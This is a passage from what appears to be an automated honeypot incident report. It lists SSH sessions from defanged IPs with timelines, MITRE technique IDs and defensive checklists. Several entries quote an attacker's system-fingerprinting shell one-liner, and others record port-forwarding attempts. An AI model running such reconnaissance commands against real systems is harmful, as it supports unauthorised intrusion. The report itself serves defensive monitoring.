- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4810475444b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:47 |
| **Last Seen** | 2026-07-09 12:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:47:10` | `cowrie.session.connect` |
| `2026-07-09 12:47:10` | `cowrie.client.version` |
| `2026-07-09 12:47:10` | `cowrie.client.kex` |
| `2026-07-09 12:47:12` | `cowrie.login.success` |
| `2026-07-09 12:47:14` | `cowrie.session.params` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.success` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.command.input` |
| `2026-07-09 12:47:14` | `cowrie.log.closed` |
| `2026-07-09 12:47:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3e23ad89dc4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:51 |
| **Last Seen** | 2026-07-09 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:51:47` | `cowrie.session.connect` |
| `2026-07-09 12:51:47` | `cowrie.client.version` |
| `2026-07-09 12:51:47` | `cowrie.client.kex` |
| `2026-07-09 12:51:49` | `cowrie.login.success` |
| `2026-07-09 12:51:50` | `cowrie.session.params` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.success` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:50` | `cowrie.command.input` |
| `2026-07-09 12:51:51` | `cowrie.log.closed` |
| `2026-07-09 12:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-decd25e9fa5f

| Field | Detail |
|---|---|
| **Source IP** | `112.27.38[.]203` |
| **First Seen** | 2026-07-09 12:53 |
| **Last Seen** | 2026-07-09 12:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:53:07` | `cowrie.session.connect` |
| `2026-07-09 12:53:08` | `cowrie.client.version` |
| `2026-07-09 12:53:08` | `cowrie.client.kex` |
| `2026-07-09 12:53:11` | `cowrie.login.success` |
| `2026-07-09 12:53:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.38[.]203` to AbuseIPDB if not already reported
- [ ] Block `112.27.38[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3cfde9e8a99

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:54 |
| **Last Seen** | 2026-07-09 12:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:54:00` | `cowrie.session.connect` |
| `2026-07-09 12:54:01` | `cowrie.client.version` |
| `2026-07-09 12:54:01` | `cowrie.client.kex` |
| `2026-07-09 12:54:02` | `cowrie.login.success` |
| `2026-07-09 12:54:04` | `cowrie.session.params` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.success` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:04` | `cowrie.command.input` |
| `2026-07-09 12:54:05` | `cowrie.log.closed` |
| `2026-07-09 12:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656b35e18e7c

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-09 12:54 |
| **Last Seen** | 2026-07-09 12:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:54:50` | `cowrie.session.connect` |
| `2026-07-09 12:54:51` | `cowrie.client.version` |
| `2026-07-09 12:54:51` | `cowrie.client.kex` |
| `2026-07-09 12:54:53` | `cowrie.login.success` |
| `2026-07-09 12:54:54` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8b7beec261a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 12:55 |
| **Last Seen** | 2026-07-09 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:55:55` | `cowrie.session.connect` |
| `2026-07-09 12:55:55` | `cowrie.client.version` |
| `2026-07-09 12:55:55` | `cowrie.client.kex` |
| `2026-07-09 12:55:56` | `cowrie.login.success` |
| `2026-07-09 12:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b19fc6da2a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 12:55 |
| **Last Seen** | 2026-07-09 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:55:56` | `cowrie.session.connect` |
| `2026-07-09 12:55:56` | `cowrie.client.version` |
| `2026-07-09 12:55:56` | `cowrie.client.kex` |
| `2026-07-09 12:55:57` | `cowrie.login.success` |
| `2026-07-09 12:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8809d6dc1a9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:56 |
| **Last Seen** | 2026-07-09 12:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:56:22` | `cowrie.session.connect` |
| `2026-07-09 12:56:22` | `cowrie.client.version` |
| `2026-07-09 12:56:22` | `cowrie.client.kex` |
| `2026-07-09 12:56:24` | `cowrie.login.success` |
| `2026-07-09 12:56:26` | `cowrie.session.params` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.success` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.command.input` |
| `2026-07-09 12:56:26` | `cowrie.log.closed` |
| `2026-07-09 12:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c422e8876f81

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-07-09 12:56 |
| **Last Seen** | 2026-07-09 12:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:56:40` | `cowrie.session.connect` |
| `2026-07-09 12:56:41` | `cowrie.client.version` |
| `2026-07-09 12:56:41` | `cowrie.client.kex` |
| `2026-07-09 12:56:43` | `cowrie.login.success` |
| `2026-07-09 12:56:44` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25481bfb4797

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-09 12:56 |
| **Last Seen** | 2026-07-09 12:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:56:50` | `cowrie.session.connect` |
| `2026-07-09 12:56:50` | `cowrie.client.version` |
| `2026-07-09 12:56:50` | `cowrie.client.kex` |
| `2026-07-09 12:56:53` | `cowrie.login.success` |
| `2026-07-09 12:56:54` | `cowrie.direct-tcpip.request` |
| `2026-07-09 12:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f43e49e149

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 12:58 |
| **Last Seen** | 2026-07-09 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:58:41` | `cowrie.session.connect` |
| `2026-07-09 12:58:41` | `cowrie.client.version` |
| `2026-07-09 12:58:41` | `cowrie.client.kex` |
| `2026-07-09 12:58:44` | `cowrie.login.success` |
| `2026-07-09 12:58:46` | `cowrie.session.params` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.success` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.command.input` |
| `2026-07-09 12:58:46` | `cowrie.log.closed` |
| `2026-07-09 12:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c8c019641d

| Field | Detail |
|---|---|
| **Source IP** | `61.2.44[.]54` |
| **First Seen** | 2026-07-09 12:59 |
| **Last Seen** | 2026-07-09 13:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 12:59:54` | `cowrie.session.connect` |
| `2026-07-09 12:59:55` | `cowrie.client.version` |
| `2026-07-09 12:59:55` | `cowrie.client.kex` |
| `2026-07-09 12:59:56` | `cowrie.login.success` |
| `2026-07-09 12:59:57` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.44[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.2.44[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1337470ac389

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:01 |
| **Last Seen** | 2026-07-09 13:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:01:00` | `cowrie.session.connect` |
| `2026-07-09 13:01:00` | `cowrie.client.version` |
| `2026-07-09 13:01:00` | `cowrie.client.kex` |
| `2026-07-09 13:01:02` | `cowrie.login.success` |
| `2026-07-09 13:01:04` | `cowrie.session.params` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.success` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:04` | `cowrie.command.input` |
| `2026-07-09 13:01:05` | `cowrie.log.closed` |
| `2026-07-09 13:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb9a4e896093

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:02 |
| **Last Seen** | 2026-07-09 13:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:02:49` | `cowrie.session.connect` |
| `2026-07-09 13:02:50` | `cowrie.client.version` |
| `2026-07-09 13:02:50` | `cowrie.client.kex` |
| `2026-07-09 13:02:55` | `cowrie.login.success` |
| `2026-07-09 13:02:59` | `cowrie.session.params` |
| `2026-07-09 13:02:59` | `cowrie.command.input` |
| `2026-07-09 13:03:00` | `cowrie.log.closed` |
| `2026-07-09 13:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a25f115c8e81

| Field | Detail |
|---|---|
| **Source IP** | `14.29.204[.]161` |
| **First Seen** | 2026-07-09 13:03 |
| **Last Seen** | 2026-07-09 13:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:03:05` | `cowrie.session.connect` |
| `2026-07-09 13:03:07` | `cowrie.client.version` |
| `2026-07-09 13:03:07` | `cowrie.client.kex` |
| `2026-07-09 13:03:11` | `cowrie.login.success` |
| `2026-07-09 13:03:12` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.204[.]161` to AbuseIPDB if not already reported
- [ ] Block `14.29.204[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507049f451e0

| Field | Detail |
|---|---|
| **Source IP** | `85.30.248[.]213` |
| **First Seen** | 2026-07-09 13:03 |
| **Last Seen** | 2026-07-09 13:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:03:18` | `cowrie.session.connect` |
| `2026-07-09 13:03:19` | `cowrie.client.version` |
| `2026-07-09 13:03:19` | `cowrie.client.kex` |
| `2026-07-09 13:03:20` | `cowrie.login.success` |
| `2026-07-09 13:03:21` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.248[.]213` to AbuseIPDB if not already reported
- [ ] Block `85.30.248[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b6c81aceae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:03 |
| **Last Seen** | 2026-07-09 13:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:03:21` | `cowrie.session.connect` |
| `2026-07-09 13:03:21` | `cowrie.client.version` |
| `2026-07-09 13:03:21` | `cowrie.client.kex` |
| `2026-07-09 13:03:24` | `cowrie.login.success` |
| `2026-07-09 13:03:26` | `cowrie.session.params` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.success` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.command.input` |
| `2026-07-09 13:03:26` | `cowrie.log.closed` |
| `2026-07-09 13:03:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd81c8873e2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 13:03 |
| **Last Seen** | 2026-07-09 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:03:22` | `cowrie.session.connect` |
| `2026-07-09 13:03:22` | `cowrie.client.version` |
| `2026-07-09 13:03:22` | `cowrie.client.kex` |
| `2026-07-09 13:03:23` | `cowrie.login.success` |
| `2026-07-09 13:03:23` | `cowrie.session.params` |
| `2026-07-09 13:03:23` | `cowrie.command.input` |
| `2026-07-09 13:03:23` | `cowrie.log.closed` |
| `2026-07-09 13:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5aa0b298af

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:05 |
